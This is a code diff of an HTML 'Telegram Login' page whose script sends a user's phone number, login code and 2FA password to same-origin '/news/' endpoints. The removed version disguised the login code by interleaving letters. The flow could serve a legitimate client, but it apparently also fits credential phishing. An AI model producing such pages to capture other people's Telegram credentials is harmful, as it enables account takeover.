@@ -1,74 +1,113 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Telegram Login</title>
+    <style>
+      .login-container {
+        max-width: 400px;
+        margin: 50px auto;
+        padding: 20px;
+      }
+      .input-group {
+        margin: 15px 0;
+      }
+      input {
+        width: 100%;
+        padding: 8px;
+        margin: 5px 0;
+      }
+      button {
+        width: 100%;
+        padding: 10px;
+        background: #0088cc;
+        color: white;
+        border: none;
+        cursor: pointer;
+      }
+    </style>
   </head>
   <body>
-    <h1>Telegram Login</h1>
-    <form id="phoneForm">
-      <label for="phoneNumber">Phone Number:</label>
-      <input
-        type="text"
-        id="phoneNumber"
-        name="phoneNumber"
-        required
-      /><br /><br />
-      <button type="submit">Send Code</button>
-    </form>
-    <form id="codeForm">
-      <label for="phoneCode">Phone Code:</label>
-      <input type="text" id="phoneCode" name="phoneCode" required /><br /><br />
-      <button type="submit">Login</button>
-    </form>
+    <div class="login-container">
+      <div id="phone-form" class="input-group">
+        <input
+          type="text"
+          id="phone"
+          placeholder="Phone number (e.g., +1234567890)"
+        />
+        <button onclick="startLogin()">Send Code</button>
+      </div>
+
+      <div id="code-form" class="input-group" style="display: none">
+        <input type="text" id="code" placeholder="Enter verification code" />
+        <button onclick="verifyCode()">Verify Code</button>
+      </div>
+
+      <div id="password-form" class="input-group" style="display: none">
+        <input type="password" id="password" placeholder="Enter 2FA password" />
+        <button onclick="submitPassword()">Submit Password</button>
+      </div>
+
+      <div id="status"></div>
+    </div>
+
     <script>
-      function obfuscateCode(code) {
-        return code.split('').join('a')
+      async function startLogin() {
+        const phoneNumber = document.getElementById('phone').value
+        const response = await fetch('/news/send-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phoneNumber }),
+        })
+        const data = await response.json()
+
+        if (data.success) {
+          document.getElementById('phone-form').style.display = 'none'
+          document.getElementById('code-form').style.display = 'block'
+        } else {
+          document.getElementById('status').textContent = data.error
+        }
       }
 
-      document
-        .getElementById('phoneForm')
-        .addEventListener('submit', async function (event) {
-          event.preventDefault()
-          const phoneNumber = document.getElementById('phoneNumber').value
-
-          const response = await fetch('/news/sendCode', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ phoneNumber }),
-          })
-
-          const result = await response.json()
-          if (result.success) {
-            document.getElementById('phoneForm').style.display = 'none'
-            document.getElementById('codeForm').style.display = 'block'
-          } else {
-            alert(result.message)
-          }
+      async function verifyCode() {
+        const phoneNumber = document.getElementById('phone').value
+        const phoneCode = document.getElementById('code').value
+        const response = await fetch('/news/verify-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phoneNumber, phoneCode }),
         })
+        const data = await response.json()
 
-      document
-        .getElementById('codeForm')
-        .addEventListener('submit', async function (event) {
-          event.preventDefault()
-          const phoneNumber = document.getElementById('phoneNumber').value
-          const phoneCode = document.getElementById('phoneCode').value
-          const obfuscatedCode = obfuscateCode(phoneCode)
+        if (data.requiresPassword) {
+          document.getElementById('code-form').style.display = 'none'
+          document.getElementById('password-form').style.display = 'block'
+        } else if (data.success) {
+          document.getElementById('status').textContent =
+            'Successfully logged in!'
+          console.log('User data:', data.user)
+        } else {
+          document.getElementById('status').textContent = data.error
+        }
+      }
 
-          const response = await fetch('/news/authTelegram', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ phoneNumber, phoneCode: obfuscatedCode }),
-          })
-
-          const result = await response.json()
-          alert(result.message)
+      async function submitPassword() {
+        const password = document.getElementById('password').value
+        const response = await fetch('/news/submit-password', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ password }),
         })
+        const data = await response.json()
+
+        if (data.success) {
+          document.getElementById('password-form').style.display = 'none'
+          document.getElementById('status').textContent =
+            'Successfully logged in!'
+          console.log('User data:', data.user)
+        } else {
+          document.getElementById('status').textContent = data.error
+        }
+      }
     </script>
   </body>
 </html>
